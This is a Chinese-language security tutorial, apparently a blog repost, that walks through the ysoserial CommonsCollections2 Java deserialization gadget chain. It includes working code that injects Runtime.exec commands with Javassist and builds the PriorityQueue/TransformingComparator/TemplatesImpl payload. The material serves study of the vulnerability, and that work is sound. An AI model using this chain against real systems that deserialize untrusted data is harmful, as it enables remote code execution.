> 原文链接: https://www.anquanke.com//post/id/232592 


# ysoserial CommonsCollections2 详细分析


                                阅读量   
                                **122042**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p0.ssl.qhimg.com/t0174eb23885b859a66.jpg)](https://p0.ssl.qhimg.com/t0174eb23885b859a66.jpg)



上篇文章详细分析了CommonsCollections1利用链的基础技术和构造，本节继续学习CC2链的构造和利用，将会涉及到新的知识点和反序列化知识。CC2链构造巧妙，但其中有很多坑点，也有很多细节，目前大佬们都对此比较清楚，我从刚入门的角度去分析此链的巧妙之处。

想了半天关于这篇文章怎么写才能把CC2这条链的艺术性表现的更完美，CC2不同于之前CC1，它依赖4.0版本的commons-collections，因此最后命令执行函数也有了大的变化。为了更清晰的其利用思路，打算从以下顺序展开。
1. 命令执行新思路
1. 序列化入口与命令执行的链接
1. Payload构造方法
1. 期间遇到的各种问题


## 0x01 命令执行新思路

在分析命令执行点之前，先把本次分析使用到的Java基础技术学习一下。在生成命令执行类的时候用到了三大技术，其一是通过反射操作类中的属性，其二是通过Javassist在Java字节码中插入命令执行代码，其三是通过ClassLoader加载修改好的字节码。

### <a class="reference-link" name="0x1%20%E5%88%A9%E7%94%A8%E5%8F%8D%E5%B0%84%E6%93%8D%E4%BD%9C%E7%B1%BB"></a>0x1 利用反射操作类

在分析CC1利用链的时候有讲到反射的作用和基本概念，从CC2开始就大量的使用到了反射的特性，如果对这个感兴趣的话可以看下ysoserial工具中ysoserial.payloads.util。该工具库继承了关于反射操作的所有代码，编写的非常规范，本次也是借鉴这个代码进行学习。

回顾之前介绍的Class类（如下图所示），它是保存类信息的类，在每个类生成之前会与Class对象进行双向绑定。可以通过这个Class对象a2获取到关于它关联类B的相关方法类和属性类。

[![](https://p4.ssl.qhimg.com/t011ab5180666612e6d.png)](https://p4.ssl.qhimg.com/t011ab5180666612e6d.png)

**设置对象属性**

假设一个场景，将obj的name属性设置为value

```
Field field = null;
class clazz = obj.getClass();
try`{`
    field = clazz.getDeclaredField(fieldName);//获取名为fieldName的属性对象
    field.setAccessible();//设置访问权限
`}`
catch()`{`//如果有异常捕获，就从父类中寻找
    if (clazz.getSuperclass() != null)//如果父类不为空，从父类中获取属性对象
    field = clazz.getSuperclass().getDeclaredField(fieldName);
`}`

field.set(obj,value);//把obj中的该属性值设置为value
```

### <a class="reference-link" name="0x2%20%E5%88%A9%E7%94%A8Javassist%E6%93%8D%E4%BD%9C%E5%AD%97%E8%8A%82%E7%A0%81"></a>0x2 利用Javassist操作字节码

**<a class="reference-link" name="1.%20%E7%AE%80%E5%8D%95%E7%90%86%E8%A7%A3"></a>1. 简单理解**

JAVAssist( JAVA Programming ASSISTant ) 是一个开源的分析 , 编辑 , 创建 Java字节码( Class )的类库 . 他允许开发者自由的在一个已经编译好的类中添加新的方法，或者是修改已有的方法。

> 对Javassist简单的理解，我们使用java反射机制动态的获取和修改对象中的成员变量，同时使用Javassist动态的获取和修改对象中的方法。

**<a class="reference-link" name="2.%20%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8"></a>2. 如何使用**

一般的操作如下

```
package com.reflect;
import javassist.CannotCompileException;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.NotFoundException;
import java.io.IOException;

public class test4 `{`
    public static void main(String[] args) throws NotFoundException, CannotCompileException, IOException `{`
        ClassPool pool = ClassPool.getDefault();//获取类搜索路径（从默认的JVM类搜索路径搜索）
        CtClass clazz = pool.get(test4.class.getName());//将test4类放入hashtable并返回CtClass对象
        String cmd = "java.lang.Runtime.getRuntime().exec(\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\");";
        clazz.makeClassInitializer().insertBefore(cmd);//在static前面插入
        clazz.makeClassInitializer().insertAfter(cmd);//在static后面插入
        String Name = "hehehe";
        clazz.setName(Name);//设置类名
        clazz.writeFile("./a.class");//写入文件
    `}`
`}`
```

CtClass( compile-time class , 编译时类信息 ) 是一个 Class 文件在代码中的抽象表现形式 , 用于处理类文件 .在pool.get获取过对象类之后，就可以对字节码进行操作了，setName为设置字节码中类名，writeFile为将字节码保存到文件中。

这段代码的意义在于makeClassInitializer函数在类中生成静态方法，并insert添加一段恶意代码，如下图所示，目前来看insertBefore和insertAfter的作用为Static代码块的前后分别插入。

[![](https://p5.ssl.qhimg.com/t012d343c52120527c7.png)](https://p5.ssl.qhimg.com/t012d343c52120527c7.png)

### <a class="reference-link" name="0x3%20%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81"></a>0x3 加载字节码

我们都知道java可以编译成字节码给jvm虚拟机去执行，但是本文涉及到的另一个技术就是在java代码中加载并执行字节码。可以配合Javassist类先读取字节码，再修改字节码，之后加载字节码。

不论是Java上层代码还是JVM加载字节码都是使用的**ClassLoader**类，这个类在我们学习Java代理时也有见过，从名字也能看出他是负责类加载的。具体的使用方法如下：

首先去实现ClassLoader抽象类

[![](https://p0.ssl.qhimg.com/t01c401def1cea19727.png)](https://p0.ssl.qhimg.com/t01c401def1cea19727.png)

```
class U extends ClassLoader`{`
    U(ClassLoader c)`{`//构造方法的ClassLoader类型参数
        super(c);
    `}`
    public Class g(byte []b)`{`
        return super.defineClass(b,0,b.length);//加载字节码
    `}`
`}`

//在test4类的最后把字节码写入文件改为如下代码
final byte[] classBytes = clazz.toBytecode();//获取字节码
new U(test4.class.getClassLoader()).g(classBytes).newInstance();//加载字节码并创建对象
```

执行代码最终会执行命令，弹出计算器。

### <a class="reference-link" name="0x4%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%82%B9%E5%88%86%E6%9E%90"></a>0x4 命令执行点分析

讲了这么基础知识后分析命令执行点就会轻松很多，首先我们要明白一点，CC1中的命令执行链在这里是不能用的，因为CC2针对的额CommonCollection4，CC1里的一些类发生了很大的变化导致不能反序列化。下面一起看下CC2命令执行的设计思路。

命令执行点一般是**构造Payload的起点**，是**反序列化的终点**。

Javassist可以将类加载成字节码格式并能对其中的方法进行修改，那么这就很符合序列化的特征（指的是将类加载成字符串格式），因为这样就可以把这个序列化后的字符串给其他类的变量赋值了，如果那个类有将这个变量中的字节码给实例化成对象，那么就会触发其中的static的方法。这个也是CC2的整个利用思路，这么说起来很是枯燥，我们结合ysoserial中的编写方法，给大家梳理一下整个逻辑。

**<a class="reference-link" name="1.%20%E5%88%9B%E5%BB%BATemplatesImpl%E5%AF%B9%E8%B1%A1"></a>1. 创建TemplatesImpl对象**

为什么是这个类，这里就有讲究了，在TemplatesImpl类中存在加载字节码并创建实例的函数

[![](https://p2.ssl.qhimg.com/t01066fe4d40bc50eae.png)](https://p2.ssl.qhimg.com/t01066fe4d40bc50eae.png)

代码中283行生成了抽象类ClassLoader的子类对象，为的是加载java字节码

```
static final class TransletClassLoader extends ClassLoader `{`
TransletClassLoader(ClassLoader parent) `{`
super(parent);
`}`
```

_bytecodes是一个二维数组，其中存放着要加载的java字节码

[![](https://p1.ssl.qhimg.com/t012fa44b9aed67db11.png)](https://p1.ssl.qhimg.com/t012fa44b9aed67db11.png)

字节码生成之后，通过newInstance函数创建实例

[![](https://p4.ssl.qhimg.com/t011595cd7dc56cec74.png)](https://p4.ssl.qhimg.com/t011595cd7dc56cec74.png)

**<a class="reference-link" name="2.%20%E7%94%9F%E6%88%90%E5%B8%A6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84Java%E5%AD%97%E8%8A%82%E7%A0%81"></a>2. 生成带命令执行的Java字节码**

这一步是要生成Java字节码并填充在TemplatesImpl对象的_bytecodes属性里。

```
ClassPool pool = ClassPool.getDefault();
final CtClass clazz = pool.get(StubTransletPayload.class.getName());//搜索并获取类
String cmd = "java.lang.Runtime.getRuntime().exec(\"" +
        command.replaceAll("\\\\","\\\\\\\\").replaceAll("\"", "\\\"") +
        "\");";
((CtClass) clazz).makeClassInitializer().insertAfter(cmd);//在静态代码中插入恶意命令
clazz.setName("ysoserial.Pwner" + System.nanoTime());
final byte[] classBytes = clazz.toBytecode();
```

这里的StubTransletPayload类是自己构造的，并且一定要继承抽象类AbstractTranslet，该类的代码如下

```
public static class StubTransletPayload extends AbstractTranslet implements Serializable `{`
    public void transform (DOM document, SerializationHandler[] handlers ) throws TransletException `{``}`
    @Override
    public void transform (DOM document, DTMAxisIterator iterator, SerializationHandler handler ) throws TransletException `{``}`
`}`
```

**<a class="reference-link" name="3.%20%E5%8A%A8%E6%80%81%E4%BF%AE%E6%94%B9TemplatesImpl%E5%AF%B9%E8%B1%A1%E5%B1%9E%E6%80%A7"></a>3. 动态修改TemplatesImpl对象属性**

生成过Java字节码之后，就要将其填充至TemplatesImpl对象属性中

```
setFieldValue(templates, "_bytecodes", new byte[][] `{`
        classBytes`}`);//最关键的一步，填充字节码
setFieldValue(templates, "_name", "Pwnr");//必须要填，之后会有检查
setFieldValue(templates, "_tfactory", Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl").newInstance());
```

`_tfactory` 字段是可选的，如果这里不赋值也不会有任何事情发生

### <a class="reference-link" name="0x5%20%E8%B0%83%E7%94%A8%E5%85%B3%E7%B3%BB"></a>0x5 调用关系

整理出了在反序列化触发时的调用链，如下图所示

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01057e029c0b4e39fd.png)



## 0x02 反序列化入口与命令执行点的连接

基本的命令执行点已经清楚了，本小节从命令执行点开始分析如何与反序列化readobject进行关联挂钩。在本节小结的时候会用正常的利用链挖掘思路分析该链的完整构造。

### <a class="reference-link" name="0x1%20Templates%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E9%93%BE"></a>0x1 Templates命令执行链

在生成TemplatesImpl对象之后就通过反射的方法，把其中的`_class`,`_name`属性修改成对应的值。

[![](https://p5.ssl.qhimg.com/t016366502b7ca0612b.png)](https://p5.ssl.qhimg.com/t016366502b7ca0612b.png)

一但触发执行newTransformer函数，整个调用链就会执行。下面的问题就是谁调用该函数。首先就要看一看反序列化的入口函数readObject了

### <a class="reference-link" name="0x2%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E5%8F%A3%E5%87%BD%E6%95%B0"></a>0x2 反序列化入口函数

这次反序列化的对象是PriorityQueue这个类，其readObject方法如下

[![](https://p0.ssl.qhimg.com/t01b5b71e4d6a02626a.png)](https://p0.ssl.qhimg.com/t01b5b71e4d6a02626a.png)

可以直观的看出在该函数中`s.defaultReadObject()`调用默认的方法，利用readInt读取了数组的大小，接着通过`s.readObject()`读取Queue中的元素，因为在反序列化的时候队列元素也被序列化了

[![](https://p5.ssl.qhimg.com/t013b3f70cddeb64673.png)](https://p5.ssl.qhimg.com/t013b3f70cddeb64673.png)

所以如果队列中的元素是构造好的反序列化利用链，那么就可以直接触发该链执行命令。但这个毫无意义，继续分析readObject最终会调用heapify函数，该函数将无序数组 queue 的内容还原为二叉堆( 优先级队列 )

该函数中会循环寻找最后一个非叶子节点 , 然后倒序调用 siftDown() 方法会调用siftDown，这里的节点其实就是Queue队列元素

[![](https://p1.ssl.qhimg.com/t01423730082bf3fb3e.png)](https://p1.ssl.qhimg.com/t01423730082bf3fb3e.png)

之后会根据是否拥有比较器，进入不同的比较方法中

[![](https://p1.ssl.qhimg.com/t01c8a1163cb151e9ad.png)](https://p1.ssl.qhimg.com/t01c8a1163cb151e9ad.png)

比较器的赋值是在PriorityQueue的构造方法中进行的，所以这部分可控

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t0165f1739615f0722c.png)

之后进入siftDownUsingComparator函数调用比较器的compare方法

[![](https://p0.ssl.qhimg.com/t01ab36321a041a3cdd.png)](https://p0.ssl.qhimg.com/t01ab36321a041a3cdd.png)

分析到这看起来不能和命令执行链连接在一起，画个图记录一下

[![](https://p1.ssl.qhimg.com/t01f2f7d25122355ef7.png)](https://p1.ssl.qhimg.com/t01f2f7d25122355ef7.png)

接下来就要找个链把他们两个连接在一起，可以发现反序列化readObject最后调用的是comparator的compare方法，并且把队列元素也传递进去了，如果队里的元素中有构造好的TemplatesImpl对象，那么只需寻找一个符合条件的comparator比较器，其中的compare方法调用参数的newTransformer方法就可以实现连接了。最后分析起到承上启下作用的TransformingComparator比较器。

### <a class="reference-link" name="0x3%20%E6%89%BF%E4%B8%8A%E5%90%AF%E4%B8%8B%E4%B9%8BTransformingComparator%E6%AF%94%E8%BE%83%E5%99%A8"></a>0x3 承上启下之TransformingComparator比较器

看下该比较器的compare方法，如下图所示

[![](https://p3.ssl.qhimg.com/t01388b5f2572c8d6aa.png)](https://p3.ssl.qhimg.com/t01388b5f2572c8d6aa.png)

令人欣慰的是这个方法调用了我们最熟悉的transform函数，因为this.transformer是通过构造函数调用的，所以可以人为构造，让其调用任意方法，只需传入相对应的对象即可，这不正是我们需要的函数类型嘛

[![](https://p0.ssl.qhimg.com/t01838b84d1e2ec7123.png)](https://p0.ssl.qhimg.com/t01838b84d1e2ec7123.png)

于是完整的链就成了下图所示：

[![](https://p3.ssl.qhimg.com/t019438ead74d456810.png)](https://p3.ssl.qhimg.com/t019438ead74d456810.png)

### <a class="reference-link" name="0x4%20%E5%B0%8F%E7%BB%93"></a>0x4 小结

推理下整个利用过程吧
1. 发现PriorityQueue的readObject可以调用构造方法参数中的比较器参数的compare方法
1. 接着发现TransformingComparator比较器可以利用compare方法以及其构造参数transformer调用任意对象的任意方法
1. 又因为利用的是CommonsCollections4，所以之前的命令执行链不能使用，所以寻找了个新的命令执行点，只需调用该对象的newTransformer方法即可触发
1. 新的命令执行点包含对Java字节码修改、加载、创建对象、反射等操作，分析起来也挺有意思


## 0x03 Payload构造方法

讲了这么多的原理，终归是要到实践上的，本小节主要介绍构造Payload的具体方法和步骤。

### <a class="reference-link" name="0x1%20%E6%9E%84%E9%80%A0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E9%93%BE"></a>0x1 构造命令执行链

在第一节就已经介绍了其构造方式，这里直接使用包装好的函数

```
final Object templates = createTemplatesImpl("/System/Applications/Calculator.app/Contents/MacOS/Calculator");
```

这个templates对象不着急被使用，根据上节分析应该是要当作PriorityQueue的元素。

### <a class="reference-link" name="0x2%20%E7%94%9F%E6%88%90PriorityQueue%E5%AF%B9%E8%B1%A1"></a>0x2 生成PriorityQueue对象

需要注意的是在生成InvokerTransformer对象的时候指定其调用方法名为Object所有类的父类方法toString为了保证在构造反序列化链的过程中不报错

```
final InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);

final PriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;Object&gt;(2,new TransformingComparator(transformer));
```

正如之前分析的一样，将transfomer作为TransformingComparator的构造方法将TransformingComparator作为invokerTransformer的构造方法。

### <a class="reference-link" name="0x3%20%E6%B7%BB%E5%8A%A0%E5%85%83%E7%B4%A0%E5%B9%B6%E4%BF%AE%E6%94%B9%E5%B1%9E%E6%80%A7"></a>0x3 添加元素并修改属性

现在还没实现命令执行链的装链操作，有两种方法都可以实现

**<a class="reference-link" name="1.%20%E6%96%B9%E6%B3%95%E4%B8%80%20%E5%8D%A0%E4%BD%8D%E5%85%83%E7%B4%A0"></a>1. 方法一 占位元素**

关于为什么要add这个问题最后统一解答

```
queue.add(1);
queue.add(1);
setFieldValue(transformer, "iMethodName", "newTransformer");
final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
queueArray[0] = templates;
queueArray[1] = 1;
```

其中有一步修改transformer对象的iMethodName值，是因为要触发TransformingComparator的newTransformer方法，调用命令执行链。最后将队列的0号元素改为命令执行链入口类。

**<a class="reference-link" name="2.%20%E6%96%B9%E6%B3%95%E4%BA%8C%20%E7%9B%B4%E6%8E%A5%E6%B7%BB%E5%8A%A0"></a>2. 方法二 直接添加**

直接templates到队列中也是可行的，最后也要修改iMethodName的值。

```
queue.add(templates);
queue.add(new String("n"));
// switch method called by comparator
setFieldValue(transformer, "iMethodName", "newTransformer");
```

### <a class="reference-link" name="0x4%20%E6%B5%8B%E8%AF%95"></a>0x4 测试

分别调用序列化和反序列化函数

```
byte[] serializeData=serialize(queue);
unserialize(serializeData);
```

函数的实现如下

```
public static byte[] serialize(final Object obj) throws Exception `{`
        ByteArrayOutputStream btout = new ByteArrayOutputStream();
        ObjectOutputStream objOut = new ObjectOutputStream(btout);
        objOut.writeObject(obj);
        return btout.toByteArray();
    `}`
    public static Object unserialize(final byte[] serialized) throws Exception `{`
        ByteArrayInputStream btin = new ByteArrayInputStream(serialized);
        ObjectInputStream objIn = new ObjectInputStream(btin);
        return objIn.readObject();
    `}`
```



## 0x04 问题总结

### <a class="reference-link" name="1.%20%E4%B8%BA%E4%BB%80%E4%B9%88%E7%94%9F%E6%88%90Java%E5%AD%97%E8%8A%82%E7%A0%81%E6%97%B6%E8%A6%81%E7%BB%A7%E6%89%BFAbstractTranslet%E7%B1%BB"></a>1. 为什么生成Java字节码时要继承AbstractTranslet类

做了一个实验如果把继承去掉如下图所示，在invokeTransformer执行newTransformer的时候会报错

[![](https://p4.ssl.qhimg.com/t0132d4113212119cf5.png)](https://p4.ssl.qhimg.com/t0132d4113212119cf5.png)

其原因在于判断了其父类的名字是否等于`com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet`，

[![](https://p3.ssl.qhimg.com/t011a1b311bc913aaee.png)](https://p3.ssl.qhimg.com/t011a1b311bc913aaee.png)

### <a class="reference-link" name="2.%20%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E8%AE%BE%E7%BD%AEtemplates%E7%9A%84_name%E5%8F%98%E9%87%8F"></a>2. 为什么要设置templates的_name变量

同样在执行newTransformer方法的时候会有对该变量的检测

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01a5490234dbb7493b.png)

如果_name为空就会return，所以必须设置该变量

### <a class="reference-link" name="3.%20%E4%B8%BA%E4%BB%80%E4%B9%88queue%E8%A6%81%E4%BA%8B%E5%85%88add%E4%B8%A4%E4%B8%AA%E5%85%83%E7%B4%A0"></a>3. 为什么queue要事先add两个元素

因为queue要通过add的方式向其中的队列添加元素，其目的是反序列化的时候queue中才能有值当做compare函数的参数，从而触发命令执行。一个行吗？答案是不行的不能触发PriorityQueue中的siftDown堆排序。

[![](https://p3.ssl.qhimg.com/t01f334e78acee39e40.png)](https://p3.ssl.qhimg.com/t01f334e78acee39e40.png)

那么为什么要用1占位，因为在add的同时也要对其做比较和排序，这一点zhouliu 师傅的文章写得已经很详细了[https://xz.aliyun.com/t/1756#toc-3](https://xz.aliyun.com/t/1756#toc-3) 。我再补充一点，add的同时可以把templates给加进去，可以是Error，String等类型但是不能是Integer类型，为什么呢？

通过调试我们可以看到当写成如下代码的时候，Queue中的元素顺序就变了

```
queue.add(new Integer(1));
        queue.add(templates);
```

PriorityQueue为优先队列，会对其中添加进去的元素按照toString规则排序，所以如果想通过直接add的方式构造payload那么尽量避免templates变量和Integer同时出现。

[![](https://p2.ssl.qhimg.com/t01248c671046f4d814.png)](https://p2.ssl.qhimg.com/t01248c671046f4d814.png)

### <a class="reference-link" name="4.%20%E4%B8%BA%E4%BB%80%E4%B9%88PriorityQueue%E7%9A%84queue%20%E4%BD%BF%E7%94%A8transient%E4%BF%AE%E9%A5%B0%E5%90%8E%E8%BF%98%E5%8F%AF%E4%BB%A5%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"></a>4. 为什么PriorityQueue的queue 使用transient修饰后还可以反序列化

zhouliu师傅也分析过这个问题，我在上面写`反序列化入口函数`这一小节的时候也分析了粗略分析了这个问题。

再次看下PriorityQueue的writeObject代码

```
private void writeObject(java.io.ObjectOutputStream s)
        throws java.io.IOException`{`
        // Write out element count, and any hidden stuff
        s.defaultWriteObject();

        // Write out array length, for compatibility with 1.5 version
        s.writeInt(Math.max(2, size + 1));

        // Write out all elements in the "proper order".
        for (int i = 0; i &lt; size; i++)
            s.writeObject(queue[i]);
    `}`
```

`s.writeObject(queue[i])`正是把queue中的元素写入了序列化字符串中，通过`queue[i] = s.readObject()`的方式赋值给了queue变量。Java是允许对象字节实现序列化方法的，以此来实现对自己的成员控制。

### <a class="reference-link" name="5.%20%E4%B8%BA%E4%BB%80%E4%B9%88InvokerTransformer%E7%9A%84%E6%96%B9%E6%B3%95%E5%90%8D%E4%B8%80%E5%BC%80%E5%A7%8B%E4%B8%8D%E8%83%BD%E4%B8%BAnewTransformer"></a>5. 为什么InvokerTransformer的方法名一开始不能为newTransformer

这个是因为在add的时候会触发compare方法，所以如果一开始InvokerTransformer的方法名为newTransformer就会在构造序列化的时候触发利用链，而且另一个元素如果没有该方法名就会报错发生异常退出。

[![](https://p1.ssl.qhimg.com/t01483b188052b6446c.png)](https://p1.ssl.qhimg.com/t01483b188052b6446c.png)



## 0x05 总结

又是一个收货多多的周末，之后会继续分析剩下的利用链，总结其中的知识点以及坑点。



## 0x06 参考文章

站在巨人的肩膀上看世界，以下文章都给了很大的启发

[https://xz.aliyun.com/t/1756](https://xz.aliyun.com/t/1756)<br>[https://www.guildhab.top/?p=6961](https://www.guildhab.top/?p=6961)
